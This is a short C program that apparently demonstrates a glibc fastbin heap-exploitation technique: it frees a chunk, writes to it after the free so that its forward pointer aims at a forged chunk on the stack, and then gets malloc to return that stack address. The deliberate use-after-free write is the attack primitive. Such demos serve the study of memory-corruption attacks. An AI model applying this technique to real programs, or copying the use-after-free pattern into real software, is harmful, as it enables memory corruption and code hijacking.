#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct fakeChunk{
		size_t prev_size;
		size_t size;
		struct fakeChunk *fd;
		struct fakeChunk *bk;
		char buf[10];
};

int main(){

	
	int *a = malloc(10);
	struct fakeChunk chunk;
	chunk.size = 0x20;            // This size should fall in the same fastbin
	char *data = (char *)&chunk.fd;     // Data starts here for an allocated chunk
	strcpy(data, "attacker's data");
	free(a);
	// Modify 'fd' pointer of 'a' to point to our forged chunk
	*((unsigned long long *)a) = (unsigned long long)&chunk;
	// Remove 'a' from HEAD of fastbin
	// Our forged chunk will now be at the HEAD of fastbin
	malloc(10);                   // Will return 0x219c010

	int *victim = malloc(10);          // Points to 0x7ffc6de966a0
	printf("%s\n", victim);   



}